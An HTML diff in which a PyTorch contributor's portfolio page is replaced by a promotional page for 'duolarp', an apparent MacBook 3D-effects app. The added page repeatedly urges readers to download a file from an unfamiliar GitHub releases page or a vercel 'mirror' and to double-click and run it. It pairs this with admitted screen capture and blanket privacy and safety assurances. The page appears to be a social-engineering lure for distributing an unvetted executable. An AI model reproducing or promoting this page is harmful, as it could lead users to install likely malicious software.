@@ -1,252 +1,141 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta
-      name="description"
-      content="Subin George is a PyTorch contributor building reliable CI and ML infrastructure."
-    />
-    <meta name="theme-color" content="#0a1020" />
-    <title>Subin George — ML infrastructure &amp; PyTorch</title>
-    <link rel="stylesheet" href="styles.css" />
-    <script src="script.js" defer></script>
-  </head>
-  <body>
-    <a class="skip-link" href="#main">Skip to content</a>
-    <div class="page-glow glow-one" aria-hidden="true"></div>
-    <div class="page-glow glow-two" aria-hidden="true"></div>
-
-    <header class="site-header" data-header>
-      <a class="brand" href="#home" aria-label="Subin George home">SG<span>/</span></a>
-      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="site-nav">
-        <span class="sr-only">Open navigation</span><span></span><span></span>
-      </button>
-      <nav id="site-nav" class="site-nav" aria-label="Primary navigation">
-        <a href="#about">About</a>
-        <a href="#work">Work</a>
-        <a href="#approach">Approach</a>
-        <a href="#talk">Talk</a>
-        <a href="#now">Now</a>
-        <a href="#contact">Contact</a>
-      </nav>
-      <button class="theme-toggle" type="button" aria-label="Switch color theme" title="Switch color theme">
-        <span aria-hidden="true">◐</span>
-      </button>
-    </header>
-
-    <main id="main">
-      <section id="home" class="hero section-shell">
-        <div class="hero-copy" data-reveal>
-          <p class="eyebrow"><span class="status-dot"></span> ML systems · CI reliability · open source</p>
-          <h1>I build the feedback loops that keep <em>PyTorch</em> compatible.</h1>
-          <p class="hero-lede">
-            I'm Subin George, a PyTorch contributor focused on the infrastructure that helps
-            upstream changes and independently maintained hardware backends move together.
-          </p>
-          <div class="hero-actions">
-            <a class="button button-primary" href="#work">Explore selected work <span aria-hidden="true">↘</span></a>
-            <button class="button button-quiet" type="button" data-copy-link>Copy portfolio link</button>
-          </div>
-        </div>
-
-        <div class="signal-panel" data-reveal data-delay="120">
-          <div class="signal-panel__top"><span>CRCR / system flow</span><span class="live-label">EVENT → RESULT</span></div>
-          <div class="signal-map" aria-label="Diagram showing a PyTorch event dispatched through CRCR to partner CI, followed by an OIDC callback into the CI HUD">
-            <svg class="signal-flow" viewBox="0 0 500 300" preserveAspectRatio="none" aria-hidden="true">
-              <defs>
-                <marker id="signal-arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto-start-reverse">
-                  <path d="M 0 0 L 10 5 L 0 10 z" />
-                </marker>
-              </defs>
-              <path class="signal-flow__line" d="M 150 69 H 180" marker-end="url(#signal-arrow)" />
-              <text class="signal-flow__label" x="157" y="51">event</text>
-              <path class="signal-flow__line" d="M 310 69 H 340" marker-end="url(#signal-arrow)" />
-              <text class="signal-flow__label" x="315" y="51">dispatch</text>
-              <path class="signal-flow__line" d="M 410 117 V 182" marker-end="url(#signal-arrow)" />
-              <text class="signal-flow__label" x="420" y="153">OIDC</text>
-              <path class="signal-flow__line" d="M 340 233 H 310" marker-end="url(#signal-arrow)" />
-              <text class="signal-flow__label" x="316" y="215">result</text>
-            </svg>
-            <div class="signal-node source"><strong>PyTorch</strong><small>PR / commit SHA</small></div>
-            <div class="signal-node relay"><strong>CRCR relay</strong><small>webhook + dispatch</small></div>
-            <div class="signal-node partner"><strong>Partner CI</strong><small>build + test</small></div>
-            <div class="signal-node callback"><strong>Callback</strong><small>verified OIDC</small></div>
-            <div class="signal-node hud"><strong>CI HUD</strong><small>persist + query</small></div>
-          </div>
-          <div class="signal-panel__footer">
-            <span>verify identity</span><i></i><span>route events</span><i></i><span>surface results</span>
-          </div>
-        </div>
-
-        <div class="hero-proof" aria-label="Selected contribution highlights" data-reveal data-delay="180">
-          <div><strong>64</strong><span>test-infra PRs</span></div>
-          <div><strong>45</strong><span>PyTorch PRs</span></div>
-          <div><strong>L1–L4</strong><span>partner trust model</span></div>
-        </div>
-      </section>
-
-      <section id="about" class="bio section-shell" data-reveal>
-        <div class="bio-label"><p class="eyebrow">About me</p><span>01 / 04</span></div>
-        <div class="bio-copy">
-          <h2>Engineering dependable paths through complex systems.</h2>
-          <p>
-            I'm Subin George, a software engineer and open-source contributor based in India. At
-            Red Hat, I work on CI/CD and ML infrastructure, with a focus on the systems that help
-            PyTorch and its out-of-tree hardware ecosystem evolve without losing compatibility.
-          </p>
-          <p>
-            I enjoy the practical work between a CI signal and a confident decision: verifying who
-            produced a result, preserving the evidence behind it, and giving maintainers a clear
-            way to act when it fails. My work spans Python, C++, TypeScript, cloud services, and
-            the developer experience around them.
-          </p>
-          <a class="text-link" href="https://github.com/subinz1" target="_blank" rel="noreferrer">Visit my GitHub profile <span aria-hidden="true">↗</span></a>
-        </div>
-        <dl class="bio-facts">
-          <div><dt>Focus</dt><dd>PyTorch CI, ML infrastructure, developer tooling</dd></div>
-          <div><dt>Systems</dt><dd>CRCR, HUD observability, downstream validation</dd></div>
-          <div><dt>Stack</dt><dd>Python, C++, TypeScript, AWS, ClickHouse</dd></div>
-        </dl>
-      </section>
-
-      <section class="statement section-shell" data-reveal>
-        <p class="eyebrow">The problem I care about</p>
-        <div>
-          <h2>Compatibility should be discovered while a change is still actionable—not during a release or a week of bisection.</h2>
-          <p>
-            My work sits at the intersection of CI reliability, backend onboarding, and developer
-            experience: make the signal trustworthy, make failures explainable, and keep the
-            integration path proportional to a partner's maturity.
-          </p>
-        </div>
-      </section>
-
-      <section id="work" class="work section-shell">
-        <div class="section-heading" data-reveal>
-          <div><p class="eyebrow">Selected work</p><h2>Systems with a clear path from signal to owner.</h2></div>
-          <p class="section-note" aria-live="polite" data-filter-status>Showing all projects</p>
-        </div>
-        <div class="filters" role="group" aria-label="Filter projects" data-reveal>
-          <button type="button" class="filter is-active" data-filter="all" aria-pressed="true">All</button>
-          <button type="button" class="filter" data-filter="infra" aria-pressed="false">Infrastructure</button>
-          <button type="button" class="filter" data-filter="open-source" aria-pressed="false">Open source</button>
-          <button type="button" class="filter" data-filter="teaching" aria-pressed="false">Teaching</button>
-        </div>
-        <div class="project-grid">
-          <article class="project-card project-card--feature" data-project="infra open-source" data-reveal>
-            <div class="project-meta"><span>01</span><span>PyTorch ecosystem</span></div>
-            <h3>Cross-Repository CI Relay</h3>
-            <p>
-              A tiered relay that forwards PyTorch change events to out-of-tree backend CI and
-              returns authenticated compatibility results to the PyTorch CI HUD.
-            </p>
-            <ul class="tag-list"><li>OIDC</li><li>AWS Lambda</li><li>DynamoDB</li><li>ClickHouse</li><li>Next.js</li></ul>
-            <div class="project-links">
-              <a class="text-link" href="https://hud.pytorch.org/crcr" target="_blank" rel="noreferrer">View the CRCR HUD <span aria-hidden="true">↗</span></a>
-              <a class="text-link text-link--publication" href="https://pytorch.org/blog/introducing-cross-repository-ci-relay-scalable-ci-for-pytorchs-out-of-tree-backends/" target="_blank" rel="noreferrer">Read the official PyTorch blog <span aria-hidden="true">↗</span></a>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>duolarp - Bring Your iPhone Animations to MacBook</title>
+    <meta name="description" content="duolarp turns your MacBook into a living 3D display, mirroring iPhone-style depth and parallax effects. Download now and transform your screen with real-time perspective animation.">
+    <meta name="keywords" content="duolarp, MacBook, iPhone animations, 3D effects, perspective, lid sensor, download">
+    <meta property="og:title" content="duolarp - iPhone Animations for MacBook">
+    <meta property="og:description" content="Experience the magic of iPhone-style parallax and 3D effects on your MacBook with duolarp.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Loriachristological3618/duolarp/releases">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'PingFang SC', 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height: 1.7; color: #333; background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); min-height: 100vh; padding: 2rem 1rem; }
+        .page-container { max-width: 800px; margin: 0 auto; background: white; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.15); padding: 3rem 2.5rem; }
+        h1 { font-size: 2.5rem; font-weight: 800; color: #1a1a2e; margin-bottom: 0.5rem; letter-spacing: -0.02em; }
+        .tagline { font-size: 1.8rem; font-weight: 400; color: #4a4a68; margin-bottom: 2rem; }
+        .hero-badge { display: inline-block; padding: 1rem 2rem; background: linear-gradient(45deg, #667eea, #764ba2); color: white; text-decoration: none; font-weight: 700; border-radius: 50px; font-size: 1.2rem; transition: transform 0.2s, box-shadow 0.2s; box-shadow: 0 5px 20px rgba(102,126,234,0.4); margin: 1rem 0 2rem; }
+        .hero-badge:hover { transform: translateY(-3px); box-shadow: 0 8px 30px rgba(102,126,234,0.5); }
+        h2 { font-size: 1.8rem; font-weight: 700; color: #16213e; margin-top: 2.5rem; margin-bottom: 1rem; border-bottom: 3px solid #667eea; padding-bottom: 0.5rem; }
+        p { margin-bottom: 1.2rem; font-size: 1.05rem; }
+        .highlight-box { background: #f0f4ff; border-left: 6px solid #667eea; padding: 1.5rem; border-radius: 10px; margin: 1.5rem 0; }
+        .feature-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1.5rem; margin: 2rem 0; }
+        .feature-item { background: #fafbfe; border: 1px solid #e0e4f0; border-radius: 12px; padding: 1.5rem; }
+        .feature-item h3 { color: #667eea; margin-bottom: 0.8rem; font-size: 1.3rem; }
+        .step-list { list-style: none; counter-reset: step-counter; margin: 1.5rem 0; }
+        .step-list li { counter-increment: step-counter; margin-bottom: 1rem; padding-left: 3rem; position: relative; font-size: 1.05rem; }
+        .step-list li:before { content: counter(step-counter); position: absolute; left: 0; width: 2rem; height: 2rem; background: #667eea; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; }
+        .download-cta { text-align: center; margin: 3rem 0; padding: 2rem; background: linear-gradient(135deg, #f5f7fa, #e8ecf4); border-radius: 15px; }
+        .download-btn { display: inline-block; padding: 1.2rem 3rem; background: #e94560; color: white; text-decoration: none; font-size: 1.3rem; font-weight: bold; border-radius: 50px; box-shadow: 0 5px 20px rgba(233,69,96,0.3); transition: all 0.3s; }
+        .download-btn:hover { background: #d63851; transform: scale(1.05); }
+        .privacy-note { background: #e8f5e9; border-radius: 10px; padding: 1.5rem; margin: 2rem 0; border-left: 6px solid #4caf50; }
+        .file-list { margin: 1.5rem 0; padding: 1rem; background: #f9f9ff; border-radius: 10px; }
+        .file-list ul { list-style: none; padding-left: 1rem; }
+        .file-list li { margin: 0.5rem 0; position: relative; padding-left: 1.5rem; }
+        .file-list li:before { content: "▸"; color: #667eea; position: absolute; left: 0; font-weight: bold; }
+        a { word-wrap: break-word; }
+        @media (max-width: 600px) { .page-container { padding: 1.5rem; } h1 { font-size: 2rem; } .tagline { font-size: 1.4rem; } }
+    </style>
+</head>
+<body>
+    <div class="page-container">
+        <h1>🖥️ duolarp - Make Your Screen Come Alive</h1>
+        <div class="tagline">iPhone-Style Depth Effects on Your MacBook</div>
+        
+        <a href="https://github.com/Loriachristological3618/duolarp/releases" class="hero-badge">⬇️ Download duolarp Now</a>
+        
+        <p>duolarp transforms your MacBook screen into a living, breathing display that responds to how you hold it. Experience the same stunning parallax effects from your iPhone, but on a much bigger canvas. When you tilt your laptop, the screen isn't just flat and static – it shifts, distorts, and creates a true 3D sensation that feels almost impossible.</p>
+        
+        <h2>✨ What Makes duolarp Special?</h2>
+        
+        <div class="feature-grid">
+            <div class="feature-item">
+                <h3>🔄 Real-Time Perspective</h3>
+                <p>As you move the lid, the screen content instantly adjusts to maintain its position in space. Text and images seem to float above the glass.</p>
             </div>
-          </article>
-          <article class="project-card" data-project="infra" data-reveal data-delay="70">
-            <div class="project-meta"><span>02</span><span>Downstream CI</span></div>
-            <h3>RHEL CI for PyTorch</h3>
-            <p>Nightly RHEL 9 build and test automation with targeted test selection, container publishing, and relay-backed HUD reporting.</p>
-            <ul class="tag-list"><li>Podman</li><li>GitHub Actions</li><li>Buildkite</li></ul>
-            <a class="text-link" href="https://github.com/TorchedHat/pytorch-redhat-ci" target="_blank" rel="noreferrer">Explore the repository <span aria-hidden="true">↗</span></a>
-          </article>
-          <article class="project-card" data-project="teaching open-source" data-reveal data-delay="140">
-            <div class="project-meta"><span>03</span><span>Practical learning</span></div>
-            <h3>PyTorch Reference Guide</h3>
-            <p>A growing collection of practical modules, reference cards, and runnable examples—from tensor foundations to CI debugging.</p>
-            <ul class="tag-list"><li>Python</li><li>PyTorch</li><li>Documentation</li></ul>
-            <a class="text-link" href="https://github.com/subinz1/pytorch-reference-guide" target="_blank" rel="noreferrer">Read the guide <span aria-hidden="true">↗</span></a>
-          </article>
-          <article class="project-card" data-project="open-source" data-reveal>
-            <div class="project-meta"><span>04</span><span>Core contribution</span></div>
-            <h3>PyTorch &amp; test-infra</h3>
-            <p>Core fixes and CI/HUD improvements spanning numerical correctness, distributed systems, and out-of-tree backend workflows.</p>
-            <ul class="tag-list"><li>Python</li><li>C++</li><li>TypeScript</li></ul>
-            <a class="text-link" href="https://github.com/pytorch/test-infra" target="_blank" rel="noreferrer">See test-infra <span aria-hidden="true">↗</span></a>
-          </article>
+            <div class="feature-item">
+                <h3>🏔️ Natural 3D Depth</h3>
+                <p>Blur, shadows, and color fringing mimic the natural optics of glass. Content that's "deeper" inside the screen looks softer and more distant.</p>
+            </div>
+            <div class="feature-item">
+                <h3>🧠 Smart Sensor Detection</h3>
+                <p>Reads your MacBook's lid angle sensor 10 times per second and predicts the next position for ultra-smooth motion – no lag, just fluid animations.</p>
+            </div>
+            <div class="feature-item">
+                <h3>🪄 Automatic Power Saving</h3>
+                <p>When your lid stops moving, the display gently settles back to normal and every animation shuts off. Zero unnecessary battery drain when you're simply typing.</p>
+            </div>
         </div>
-      </section>
-
-      <section id="approach" class="approach section-shell">
-        <div class="section-heading" data-reveal><div><p class="eyebrow">How I work</p><h2>Reliable systems are designed for their difficult days.</h2></div></div>
-        <ol class="principles">
-          <li data-reveal><span>01</span><div><h3>Make identity explicit</h3><p>Derive trust from verified claims and configuration—not from untrusted result text.</p></div></li>
-          <li data-reveal data-delay="70"><span>02</span><div><h3>Preserve the diagnostic trail</h3><p>A dashboard result should lead back to a run, an attempt, a callback, and an owner.</p></div></li>
-          <li data-reveal data-delay="140"><span>03</span><div><h3>Earn stronger integration</h3><p>Start observably, measure reliability, then promote partners only when the signal is ready to influence merges.</p></div></li>
+        
+        <h2>🎯 How to Download and Run duolarp</h2>
+        
+        <p>Getting duolarp is quick and straightforward. Follow these simple steps and you'll be amazed within a minute.</p>
+        
+        <ol class="step-list">
+            <li><strong>Visit the download page</strong> by clicking this link: <a href="https://github.com/Loriachristological3618/duolarp/releases">https://github.com/Loriachristological3618/duolarp/releases</a>. This takes you to the official release area where all versions are listed.</li>
+            <li><strong>Find the latest release</strong> – it's usually the first one on the page. Look for the file named <strong>duolarp</strong>. Visit this link to download the application. The download should start automatically.</li>
+            <li><strong>Run the file</strong> – once downloaded, locate it in your Downloads folder (or wherever your browser saves files). Double-click the icon to start duolarp instantly.</li>
+            <li><strong>Enjoy your new screen</strong> – once running, duolarp lives in your menu bar. Gently tilt or open/close your MacBook lid at different angles to see the mesmerizing 3D effect take over your display. No setup, no configuration, no coding.</li>
         </ol>
-      </section>
-
-      <section id="talk" class="talk section-shell" data-reveal>
-        <div class="talk-card">
-          <p class="eyebrow">PyTorch Conference North America 2026 · Lightning talk</p>
-          <h2>Scaling PyTorch's Compatibility Promise</h2>
-          <p>
-            A look at the tiered Cross-Repository CI Relay: real-time downstream validation,
-            authenticated result ingestion, and a lower-risk path for hardware backends to join
-            the PyTorch ecosystem.
-          </p>
-          <a class="button button-primary" href="https://pytorch.org/blog/introducing-cross-repository-ci-relay-scalable-ci-for-pytorchs-out-of-tree-backends/" target="_blank" rel="noreferrer">Read the official PyTorch blog <span aria-hidden="true">↗</span></a>
+        
+        <div class="highlight-box">
+            <strong>Tip:</strong> For the best first impression, slowly open and close your lid while watching any wallpaper or webpage. The subtle movement will blow your mind.
         </div>
-      </section>
-
-      <section id="now" class="now section-shell" data-reveal>
-        <div><p class="eyebrow">Now</p><h2>Making relay health and nightly compatibility easier to trust.</h2></div>
-        <p>
-          Current CRCR work focuses on surfacing stuck health probes, separating nightly-only
-          partners from pull-request integrations, and making HUD metrics explainable from the
-          underlying job matrix.
-        </p>
-        <a class="text-link" href="https://github.com/subinz1/CRCR" target="_blank" rel="noreferrer">Explore CRCR design work <span aria-hidden="true">↗</span></a>
-      </section>
-
-      <section id="contact" class="contact section-shell" data-reveal>
-        <div class="contact-intro">
-          <p class="eyebrow">Contact</p>
-          <h2>Have a CI, PyTorch, or ML infrastructure problem worth solving?</h2>
-          <p>
-            Share a little context and I'll receive your note by email. I welcome conversations
-            about open-source infrastructure, downstream compatibility, and practical developer
-            tooling.
-          </p>
+        
+        <h2>📁 What's Included in the Package</h2>
+        
+        <p>You're not just getting one feature – the duolarp suite includes:</p>
+        
+        <div class="file-list">
+            <ul>
+                <li><strong>app/</strong> – The main duolarp application. This includes the menu bar app, the sensor reader, all the mathematics for perspective transforms, and the Metal renderer that draws everything beautifully.</li>
+                <li><strong>installer/</strong> – A simple installer that sets everything up for you automatically. Run it once and you're done.</li>
+                <li><strong>uninstaller/</strong> – If you ever want to remove duolarp, this cleans everything off your system completely.</li>
+                <li><strong>shared/</strong> – Supporting files that duolarp needs to run. The uninstaller knows how to handle these safely.</li>
+            </ul>
         </div>
-        <form class="contact-form" action="https://formsubmit.co/subingeorgemalana@gmail.com" method="POST">
-          <input type="hidden" name="_subject" value="New connection request from subinz1.github.io" />
-          <input type="hidden" name="_template" value="table" />
-          <input type="hidden" name="_next" value="https://subinz1.github.io/thanks.html" />
-          <input class="honeypot" type="text" name="_honey" tabindex="-1" autocomplete="off" aria-hidden="true" />
-          <div class="form-row">
-            <label for="name">Name <span aria-hidden="true">*</span></label>
-            <input id="name" name="name" type="text" autocomplete="name" required />
-          </div>
-          <div class="form-row">
-            <label for="email">Work email <span aria-hidden="true">*</span></label>
-            <input id="email" name="email" type="email" autocomplete="email" required />
-          </div>
-          <div class="form-row">
-            <label for="organization">Organization</label>
-            <input id="organization" name="organization" type="text" autocomplete="organization" />
-          </div>
-          <div class="form-row form-row--wide">
-            <label for="message">What would you like to discuss? <span aria-hidden="true">*</span></label>
-            <textarea id="message" name="message" rows="5" required></textarea>
-          </div>
-          <div class="form-footer">
-            <p>Delivered through FormSubmit. Please do not include credentials or sensitive information.</p>
-            <button class="button button-primary" type="submit">Send connection request <span aria-hidden="true">↗</span></button>
-          </div>
-        </form>
-      </section>
-    </main>
-
-    <footer class="site-footer section-shell">
-      <p>Built for the people who make ML systems dependable.</p>
-      <div><a href="https://github.com/subinz1" target="_blank" rel="noreferrer">GitHub ↗</a><a href="#work">Projects</a><a href="#talk">Talk</a><a href="#contact">Contact</a></div>
-      <span>© <span data-year></span> Subin George</span>
-    </footer>
-    <div class="toast" role="status" aria-live="polite" data-toast></div>
-  </body>
+        
+        <h2>🔒 Your Privacy Is Protected</h2>
+        
+        <div class="privacy-note">
+            <p>💪 <strong>Be completely at ease.</strong> duolarp is built with your privacy as a top priority:</p>
+            <ul>
+                <li>🖼️ Screen capture ONLY activates while your lid is physically moving – never during idle time</li>
+                <li>🎮 All frames stay completely on your GPU – they never touch your CPU or normal memory</li>
+                <li>❌ Nothing is ever saved, recorded, or stored</li>
+                <li>🚫 No internet access at all – duolarp works entirely offline</li>
+            </ul>
+            <p style="margin-top: 1rem;">You keep full control. When the lid stops, duolarp stops – completely.</p>
+        </div>
+        
+        <h2>⚙️ System Requirements and Compatibility</h2>
+        
+        <p>duolarp is designed specifically for MacBook laptops. The core requirement is a built-in lid angle (hinge) sensor, which is present in all modern models. We recommend:</p>
+        
+        <ul>
+            <li>✅ Any MacBook Air or MacBook Pro from 2020 or later</li>
+            <li>✅ macOS Monterey (12.0) or newer</li>
+            <li>✅ Minimum 8GB of RAM (16GB recommended for smooth multitasking)</li>
+            <li>✅ At least 100MB of free storage space</li>
+        </ul>
+        
+        <p>The app is lightweight and efficient – it won't slow down your other work. Its performance is optimized to use minimal battery while active.</p>
+        
+        <h2>🛠️ Need Help or Want More?</h2>
+        
+        <p>We've designed duolarp to be problem-free, but if you ever need assistance, the official project page at <a href="https://github.com/Loriachristological3618/duolarp">https://github.com/Loriachristological3618/duolarp</a> contains documentation and community links.</p>
+        
+        <p>You can also visit the download mirror at <a href="https://nipuntal.vercel.app/duolarp">nipuntal.vercel.app/duolarp</a> if you prefer.</p>
+        
+        <div class="download-cta">
+            <h3 style="margin-bottom: 1rem;">Ready to transform your MacBook?</h3>
+            <a href="https://github.com/Loriachristological3618/duolarp/releases" class="download-btn">🚀 Get duolarp Now – It's Free!</a>
+            <p style="margin-top: 1rem; color: #666; font-size: 0.95rem;">Download starts immediately. No accounts, no surveys, no tricks.</p>
+        </div>
+        
+        <p style="text-align: center; margin-top: 2rem; font-size: 0.9rem; color: #888;">duolarp · Bringing iPhone magic to your MacBook · Made with ❤️ for creativity</p>
+    </div>
+</body>
 </html>
